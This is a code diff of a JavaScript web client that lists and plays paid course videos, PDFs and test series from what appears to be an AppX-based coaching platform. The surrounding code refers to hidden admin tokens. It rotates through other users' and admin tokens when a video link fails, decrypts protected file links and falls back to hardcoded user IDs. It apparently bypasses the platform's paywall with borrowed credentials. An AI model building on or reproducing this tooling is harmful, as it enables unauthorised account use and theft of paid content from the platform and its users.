-                <span class="btn-watch text-xs">Watch Classes ➔</span>
-            </div>`;
-    });
-}
-
-function openFreeLectures(topId, topName) {
-    state.view = "lectures";
-    state.topicId = topId;
-    state.topicName = topName;
-    document.getElementById("headingText").textContent = topName;
-    const list = DB.freeLectures[topId] || [];
-    document.getElementById("mainGrid").innerHTML = "";
-    renderLectureList(list, state.activeTokenObj);
-}
-
-async function loadCourseTab(tab) {
+// =====================================================
+// UNIVERSAL FOLDER NAVIGATION (V3 APNIPADHAI LOGIC)
+// =====================================================
+function loadCourseTab(tab) {
     ["subjects", "live", "tests", "telegram"].forEach(t => {
         const el = document.getElementById("sub_" + t);
         if (el) el.className = (t === tab) ? "tab-pill active-pill" : "tab-pill";
@@ -1025,129 +832,154 @@ async function loadCourseTab(tab) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading...</div>`;
 
-    // Hamesha current batch ka bound token use karein
     const batchTok = getCourseBoundToken(state.courseId);
     state.activeTokenObj = batchTok;
 
     if (tab === "subjects") {
-        state.view = "subjects";
-        const subs = await fetchAPIWithToken(`/get/folder_contentsv3?course_id=${state.courseId}&parent_id=-1&windowsapp=false&start=0`, batchTok, () => DB.paidSubjects);
-        grid.innerHTML = "";
-        subs.forEach(s => {
-            const subId = s.id || s.subjectid;
-            const name = s.Title || s.subject_name || s.subjectname || "Subject";
-            const logo = s.thumbnail || s.subject_logo || `https://placehold.co/80x80/0284c7/ffffff?text=${encodeURIComponent(name.slice(0, 3))}`;
-            grid.innerHTML += `
-                <div onclick="openPaidTopics('${subId}', '${name.replace(/'/g, "")}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
-                    <img src="${logo}" onerror="this.src='https://placehold.co/80x80/0284c7/ffffff?text=SUB'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
-                    <div class="flex-1">
-                        <span class="px-2 py-0.5 rounded bg-sky-100 text-sky-800 text-[10px] font-black">SUBJECT #${subId}</span>
-                        <h4 class="font-black text-base text-slate-900 mt-1">${name}</h4>
-                        <p class="text-xs text-blue-600 font-extrabold mt-1">Explore Topics ➔</p>
-                    </div>
-                </div>`;
-        });
+        state.view = "folders";
+        state.folderStack = []; // Reset back navigation
+        openFolderV3("-1", "📚 Subjects / Materials");
     } else if (tab === "live") {
-        const res = await fetchAPIWithToken(`/get/course_contents_by_live_status?course_id=${state.courseId}&start=-1&live_status=1,2`, batchTok, () => ({ upcoming: [] }));
-        const list = Array.isArray(res) ? res : (res.upcoming || res.live || []);
-        grid.innerHTML = "";
-        renderLectureList(list, batchTok);
+        state.view = "live";
+        fetchAPIWithToken(`/get/course_contents_by_live_status?course_id=${state.courseId}&start=-1&live_status=1,2`, batchTok, () => ({ upcoming: [] }))
+            .then(res => {
+                const list = Array.isArray(res) ? res : (res.upcoming || res.live || []);
+                grid.innerHTML = "";
+                renderLectureListAppended(list, batchTok);
+            });
     } else if (tab === "tests") {
         state.view = "batch_ts_subjects";
         const uid = batchTok.userId || extractUidFromJwt(batchTok.token) || "296064";
-        const tsList = await fetchAPIWithToken(`/get/test_seriesbycourseid?courseid=${state.courseId}&userid=${uid}&folder_wise_course=1&start=-1`, batchTok, () => DB.tsSubjects["700"]);
-        
-        grid.innerHTML = "";
-        tsList.forEach(s => {
-            const tsId = s.id || s.subjectid;
-            const sname = (s.title || s.subject_name || "Batch Test Subject").replace(/'/g, "");
-            grid.innerHTML += `
-                <div onclick="openBatchInternalTests('${tsId}', '-1', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
-                    <div>
-                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">SERIES #${tsId}</span>
-                        <h4 class="font-black text-base text-slate-900 mt-1.5">📝 ${sname}</h4>
-                        <p class="text-xs text-indigo-600 font-bold mt-1">View Subject Quizzes & Tests ➔</p>
-                    </div>
-                    <span class="btn-watch text-xs">Open ➔</span>
-                </div>`;
-        });
+        fetchAPIWithToken(`/get/test_seriesbycourseid?courseid=${state.courseId}&userid=${uid}&folder_wise_course=1&start=-1`, batchTok, () => [])
+            .then(tsList => {
+                grid.innerHTML = "";
+                if(tsList.length === 0) grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is batch mein test series nahi hai.</div>`;
+                tsList.forEach(s => {
+                    const tsId = s.id || s.subjectid;
+                    const sname = (s.title || s.subject_name || "Batch Test").replace(/'/g, "");
+                    grid.innerHTML += `
+                        <div onclick="openBatchInternalTests('${tsId}', '-1', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
+                            <div>
+                                <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">SERIES #${tsId}</span>
+                                <h4 class="font-black text-base text-slate-900 mt-1.5">📝 ${sname}</h4>
+                                <p class="text-xs text-indigo-600 font-bold mt-1">View Subject Quizzes & Tests ➔</p>
+                            </div>
+                            <span class="btn-watch text-xs">Open ➔</span>
+                        </div>`;
+                });
+            });
     } else if (tab === "telegram") {
         grid.innerHTML = `
             <div class="col-span-full grid-card p-6 flex flex-wrap justify-between items-center gap-4">
                 <div>
                     <span class="text-xs font-black text-blue-600 uppercase">Official Community</span>
-                    <h4 class="font-black text-lg text-slate-900">✈️ RWA Batch Doubt Group</h4>
+                    <h4 class="font-black text-lg text-slate-900">✈️ AppX Doubt Group</h4>
                 </div>
                 <a href="https://t.me/+ACPxjpf6oKQxM2U1" target="_blank" class="btn-watch text-xs no-underline px-5 py-3">Join Telegram ➔</a>
             </div>`;
     }
 }
 
-async function openBatchInternalTests(tsId, subId, subName) {
-    state.view = "batch_ts_tests";
-    state.activeSeriesId = tsId;
-    state.activeTsSubId = subId;
-    state.activeTsSubName = subName;
-    document.getElementById("headingText").textContent = `📝 ${subName}`;
+// THIS REPLACES openPaidTopics & openPaidLectures completely for infinite nested folders!
+async function openFolderV3(folderId, folderName, isBack = false) {
+    state.view = "folders";
+    
+    // Manage Stack for Back Navigation
+    if (!isBack && state.currentFolderId && state.currentFolderId !== folderId) {
+        state.folderStack.push({ id: state.currentFolderId, name: state.currentFolderName });
+    }
+    state.currentFolderId = folderId;
+    state.currentFolderName = folderName;
 
+    document.getElementById("headingText").textContent = `📂 ${folderName}`;
     const batchTok = getCourseBoundToken(state.courseId);
-    state.activeTokenObj = batchTok;
-    const uid = batchTok.userId || extractUidFromJwt(batchTok.token) || "4756316";
-
+    
     const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Batch Quizzes & Tests...</div>`;
+    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Opening Folder...</div>`;
 
-    const endpoint = `/get/quiztitlesbycourse?courseid=${state.courseId}&userid=${uid}&folder_wise_course=1`;
-    const titles = await fetchAPIWithToken(endpoint, batchTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["700_3171"]);
-    renderTestTitlesGrid(titles, tsId, batchTok);
-}
+    const res = await fetchAPIWithToken(`/get/folder_contentsv3?course_id=${state.courseId}&parent_id=${folderId}&start=0`, batchTok, () => []);
 
-async function openPaidTopics(subId, subName) {
-    state.view = "topics";
-    state.subjectId = subId;
-    state.subjectName = subName;
-    document.getElementById("subTabs").classList.add("hidden");
-    document.getElementById("crumbText").textContent = state.courseName;
-    document.getElementById("headingText").textContent = `📂 ${subName}`;
-
-    const batchTok = getCourseBoundToken(state.courseId);
-    state.activeTokenObj = batchTok;
-
-    const topics = await fetchAPIWithToken(`/get/folder_contentsv3?course_id=${state.courseId}&parent_id=${subId}&start=0`, batchTok, () => DB.paidTopics[subId] || []);
-    const grid = document.getElementById("mainGrid");
     grid.innerHTML = "";
 
-    topics.forEach(t => {
-        const topId = t.id || t.topicid;
-        const name = (t.Title || t.topic_name || t.topicname || "Topic").replace(/'/g, "");
+    // IMPORTANT LOGIC: If a single "Home" folder is returned, open it automatically (skips useless clicks)
+    if (folderId === "-1" && res && res.length === 1 && res[0].material_type === "FOLDER") {
+        state.folderStack = []; // Clean slate
+        return openFolderV3(res[0].id, res[0].Title, true);
+    }
+
+    if (!res || res.length === 0) {
+        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein koi item nahi hai.</div>`;
+        return;
+    }
+
+    // Sort contents: Folders first, then Videos/PDFs
+    const folders = res.filter(item => item.material_type === "FOLDER");
+    const mediaFiles = res.filter(item => item.material_type !== "FOLDER");
+
+    folders.forEach(f => {
+        const name = (f.Title || f.subject_name || f.topic_name || "Folder").replace(/'/g, "");
+        const logo = f.thumbnail || f.image || f.subject_logo || `https://placehold.co/80x80/0284c7/ffffff?text=FLD`;
         grid.innerHTML += `
-            <div onclick="openPaidLectures('${topId}', '${name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer">
-                <div>
-                    <span class="text-[10px] font-bold text-sky-700 uppercase">Topic Folder</span>
-                    <h4 class="font-black text-base text-slate-900 mt-0.5">📁 ${name}</h4>
+            <div onclick="openFolderV3('${f.id}', '${name}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
+                <img src="${logo}" onerror="this.src='https://placehold.co/80x80/0284c7/ffffff?text=FLD'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
+                <div class="flex-1">
+                    <span class="px-2 py-0.5 rounded bg-sky-100 text-sky-800 text-[10px] font-black">FOLDER #${f.id}</span>
+                    <h4 class="font-black text-base text-slate-900 mt-1">${name}</h4>
+                    <p class="text-xs text-blue-600 font-extrabold mt-1">Open Folder ➔</p>
                 </div>
-                <span class="btn-watch text-xs">Classes ➔</span>
             </div>`;
     });
+
+    if (mediaFiles.length > 0) {
+        renderLectureListAppended(mediaFiles, batchTok);
+    }
 }
 
-async function openPaidLectures(topId, topName) {
-    state.view = "lectures";
-    state.topicId = topId;
-    state.topicName = topName;
-    document.getElementById("crumbText").textContent = state.subjectName;
-    document.getElementById("headingText").textContent = `🎬 ${topName}`;
+// Universal Renderer for Media (Appends to grid without clearing it, so folders and files coexist)
+function renderLectureListAppended(list, boundTokenObj) {
+    const grid = document.getElementById("mainGrid");
+    state.currentLectureKeys = [];
+    const lectureTok = boundTokenObj || getCourseBoundToken(state.courseId);
 
-    const batchTok = getCourseBoundToken(state.courseId);
-    state.activeTokenObj = batchTok;
+    list.forEach((item, i) => {
+        const key = `lec_${item.id || i}`;
+        state.currentLectureKeys.push(key);
 
-    const classes = await fetchAPIWithToken(
-        `/get/folder_contentsv3?course_id=${state.courseId}&parent_id=${topId}&start=0`,
-        batchTok,
-        () => DB.paidLectures[topId] || []
-    );
-    document.getElementById("mainGrid").innerHTML = "";
-    renderLectureList(classes, batchTok);
+        const qMap = extractQualitiesFromItem(item);
+        const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link || item.file_link, item.ypdf_link2);
+        const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);
+        const isPdfOnly = (item.material_type === "PDF" || (!Object.keys(qMap).length && pdf1));
+
+        state.mediaMap[key] = {
+            key: key,
+            id: item.id,
+            courseId: state.courseId,
+            tokenObj: lectureTok,
+            title: item.Title || "Media Document",
+            date: item.date_and_time || item.event_date || "",
+            thumb: item.thumbnail || "",
+            qualities: qMap,
+            pdf1: pdf1,
+            pdf2: pdf2
+        };
+
+        grid.innerHTML += `
+            <div class="grid-card overflow-hidden flex flex-col justify-between">
+                <div>
+                    ${item.thumbnail ? `<img src="${item.thumbnail}" onerror="this.style.display='none'" class="w-full h-44 object-cover">` : ""}
+                    <div class="p-4">
+                        <span class="px-2.5 py-0.5 rounded-full bg-${isPdfOnly?'amber':'sky'}-100 text-${isPdfOnly?'amber':'sky'}-900 text-[10px] font-black">ID #${item.id || (i + 1)}</span>
+                        <h4 class="font-black text-base text-slate-900 mt-2">${item.Title}</h4>
+                        ${(item.date_and_time || item.event_date) ? `<p class="text-[11px] text-slate-500 font-semibold mt-1">🕒 ${item.date_and_time || item.event_date}</p>` : ""}
+                    </div>
+                </div>
+                <div class="p-4 pt-2 border-t border-sky-100 flex flex-wrap gap-2">
+                    ${!isPdfOnly ? `<button onclick="playClassInRwaPlayer('${key}')" class="btn-watch flex-1 text-xs">▶ Watch Video</button>` : ""}
+                    ${pdf1 ? `<button onclick="openPdf('${key}', 1)" class="btn-pdf1 flex-1 text-xs">📄 Open PDF 1</button>` : ""}
+                    ${pdf2 ? `<button onclick="openPdf('${key}', 2)" class="btn-pdf2 flex-1 text-xs">📄 Open PDF 2</button>` : ""}
+                </div>
+            </div>`;
+    });
 }
 
 function normalizeQualityLabel(rawLabel) {
@@ -1185,75 +1017,18 @@ function extractQualitiesFromItem(item) {
     (item.download_links || []).forEach(q => addCandidate(q.quality, q.path, false));
 
     const decFile = decryptAppX(item.file_link || "");
-    if (decFile) {
-        if (decFile.startsWith("http") && !decFile.includes("playlist_eof.m3u8")) {
-            addCandidate("720p", decFile, decFile.includes(".m3u8"));
-        } else if (!decFile.startsWith("http") && decFile.length >= 10 && decFile.length <= 15) {
-            rawMap["720p"] = decFile;
-        }
+    if (decFile && decFile.startsWith("http") && !decFile.includes("playlist_eof.m3u8")) {
+        addCandidate("720p", decFile, decFile.includes(".m3u8"));
+    } else if (decFile && !decFile.startsWith("http") && decFile.length >= 10 && decFile.length <= 15) {
+        rawMap["720p"] = decFile;
     }
 
     const order = ["1080p", "720p", "480p", "360p", "240p", "144p"];
     const sortedMap = {};
-    order.forEach(k => {
-        if (rawMap[k]) sortedMap[k] = rawMap[k];
-    });
-    Object.keys(rawMap).forEach(k => {
-        if (!sortedMap[k]) sortedMap[k] = rawMap[k];
-    });
+    order.forEach(k => { if (rawMap[k]) sortedMap[k] = rawMap[k]; });
+    Object.keys(rawMap).forEach(k => { if (!sortedMap[k]) sortedMap[k] = rawMap[k]; });
 
     return sortedMap;
-}
-
-function renderLectureList(list, boundTokenObj) {
-    const grid = document.getElementById("mainGrid");
-    state.currentLectureKeys = [];
-    const lectureTok = boundTokenObj || getCourseBoundToken(state.courseId);
-
-    if (!list || !list.length) {
-        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi class nahi hai.</div>`;
-        return;
-    }
-
-    list.forEach((item, i) => {
-        const key = `lec_${item.id || i}`;
-        state.currentLectureKeys.push(key);
-
-        const qMap = extractQualitiesFromItem(item);
-        const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link, item.ypdf_link2);
-        const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);
-
-        // Har lecture ke sath uska courseId aur boundTokenObj permanently save karein
-        state.mediaMap[key] = {
-            key: key,
-            id: item.id,
-            courseId: state.courseId,
-            tokenObj: lectureTok,
-            title: item.Title || "Class Lecture",
-            date: item.date_and_time || item.event_date || "",
-            thumb: item.thumbnail || "",
-            qualities: qMap,
-            pdf1: pdf1,
-            pdf2: pdf2
-        };
-
-        grid.innerHTML += `
-            <div class="grid-card overflow-hidden flex flex-col justify-between">
-                <div>
-                    ${item.thumbnail ? `<img src="${item.thumbnail}" onerror="this.style.display='none'" class="w-full h-44 object-cover">` : ""}
-                    <div class="p-4">
-                        <span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">CLASS #${item.id || (i + 1)}</span>
-                        <h4 class="font-black text-base text-slate-900 mt-2">${item.Title}</h4>
-                        ${(item.date_and_time || item.event_date) ? `<p class="text-[11px] text-slate-500 font-semibold mt-1">🕒 ${item.date_and_time || item.event_date}</p>` : ""}
-                    </div>
-                </div>
-                <div class="p-4 pt-2 border-t border-sky-100 flex flex-wrap gap-2">
-                    <button onclick="playClassInRwaPlayer('${key}')" class="btn-watch flex-1 text-xs">▶ Watch Video</button>
-                    ${pdf1 ? `<button onclick="openPdf('${key}', 1)" class="btn-pdf1 text-xs">📄 PDF 1</button>` : ""}
-                    ${pdf2 ? `<button onclick="openPdf('${key}', 2)" class="btn-pdf2 text-xs">📄 PDF 2</button>` : ""}
-                </div>
-            </div>`;
-    });
 }
 
 // =====================================================
@@ -1264,7 +1039,6 @@ async function playClassInRwaPlayer(key) {
     const info = state.mediaMap[key];
     if (!info) return;
 
-    // Jis token se yeh batch/lecture aaya hai, wahi token active karein
     const targetCourseId = info.courseId || state.courseId;
     const batchTok = info.tokenObj || getCourseBoundToken(targetCourseId);
     state.activeTokenObj = batchTok;
@@ -1290,12 +1064,10 @@ async function playClassInRwaPlayer(key) {
     const urlInput = document.getElementById("url");
 
     if (state.cat === "paid" && info.id) {
-        // 1. Sabse pehle exact batch token se video details fetch karein
         const videoEndpoint = `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0&lc_app_api_url=`;
         let fresh = await fetchAPIWithToken(videoEndpoint, batchTok, () => null);
         let freshMap = (fresh && typeof fresh === "object") ? extractQualitiesFromItem(fresh) : {};
 
-        // 2. Agar kisi wajah se primary token par link na mile, toh baaki tokens (Admin/User) se auto-retry karein
         if (Object.keys(freshMap).length === 0 && Object.keys(info.qualities || {}).length === 0) {
             for (const fallbackTok of getAllTokensForCourses()) {
                 if (fallbackTok.token === batchTok.token) continue;
@@ -1317,7 +1089,6 @@ async function playClassInRwaPlayer(key) {
 
         if (fresh && typeof fresh === "object") {
             info.qualities = { ...info.qualities, ...freshMap };
-
             const fPdf1 = resolvePdfUrl(fresh.pdf_link || fresh.ypdf_link, fresh.ypdf_link2);
             const fPdf2 = resolvePdfUrl(fresh.pdf_link2, fresh.ypdf_link2);
             if (fPdf1 && !info.pdf1) { info.pdf1 = fPdf1; if (pPdf1) pPdf1.classList.remove("hidden"); }
@@ -1439,6 +1210,25 @@ function changeLectureQuality(qLabel) {
 // =====================================================
 // TEST SERIES & CBT ENGINE
 // =====================================================
+async function openBatchInternalTests(tsId, subId, subName) {
+    state.view = "batch_ts_tests";
+    state.activeSeriesId = tsId;
+    state.activeTsSubId = subId;
+    state.activeTsSubName = subName;
+    document.getElementById("headingText").textContent = `📝 ${subName}`;
+
+    const batchTok = getCourseBoundToken(state.courseId);
+    state.activeTokenObj = batchTok;
+    const uid = batchTok.userId || extractUidFromJwt(batchTok.token) || "4756316";
+
+    const grid = document.getElementById("mainGrid");
+    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Batch Quizzes & Tests...</div>`;
+
+    const endpoint = `/get/quiztitlesbycourse?courseid=${state.courseId}&userid=${uid}&folder_wise_course=1`;
+    const titles = await fetchAPIWithToken(endpoint, batchTok, () => []);
+    renderTestTitlesGrid(titles, tsId, batchTok);
+}
+
 async function openTestSeriesExplorer(mode) {
     if (!enforceCompulsoryLogin()) return;
     state.tsMode = mode;
@@ -1447,7 +1237,7 @@ async function openTestSeriesExplorer(mode) {
     document.getElementById("subTabs").classList.add("hidden");
 
     const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Official RWA Test Series...</div>`;
+    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Test Series...</div>`;
 
     const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
     state.activeTokenObj = primaryTok;
@@ -1457,9 +1247,7 @@ async function openTestSeriesExplorer(mode) {
         document.getElementById("headingText").textContent = "🏆 Paid Test Series";
 
         const p0 = await fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, primaryTok, () => []);
-        const p10 = await fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, primaryTok, () => []);
-        let combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : [])];
-
+        let combined = Array.isArray(p0) ? p0 : [];
         if (combined.length === 0) combined = DB.paidTestSeries;
 
         const seen = new Set();
@@ -1488,9 +1276,7 @@ async function openTestSeriesExplorer(mode) {
         document.getElementById("headingText").textContent = "📝 Free Test Series";
 
         const f0 = await fetchAPIWithToken(`/get/quiz_test_series?start=0&exam_id=`, primaryTok, () => []);
-        const f10 = await fetchAPIWithToken(`/get/quiz_test_series?start=10&exam_id=`, primaryTok, () => []);
-        let combined = [...(Array.isArray(f0) ? f0 : []), ...(Array.isArray(f10) ? f10 : [])];
-
+        let combined = Array.isArray(f0) ? f0 : [];
         if (combined.length === 0) combined = DB.freeTestSeries;
 
         const seen = new Set();
@@ -1586,12 +1372,7 @@ function renderTestTitlesGrid(list, tsId, boundTok) {
     list.forEach((t, idx) => {
         const tKey = `test_${t.id || idx}`;
         const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf, t.pdf_url);
-        state.testMap[tKey] = {
-            ...t,
-            seriesId: tsId || t.test_series_id,
-            resolvedPdf: pdfUrl,
-            tokenObj: testTok
-        };
+        state.testMap[tKey] = { ...t, seriesId: tsId || t.test_series_id, resolvedPdf: pdfUrl, tokenObj: testTok };
 
         grid.innerHTML += `
             <div class="grid-card p-5 flex flex-col justify-between">
@@ -1899,7 +1680,7 @@ function closePdfSlide() {
 }
 
 // =====================================================
-// USER PERSONAL TOKEN LIST (NEVER SHOWS ADMIN TOKENS)
+// USER PERSONAL TOKEN LIST
 // =====================================================
 function renderTokenManagerList() {
     const container = document.getElementById("tokenListContainer");
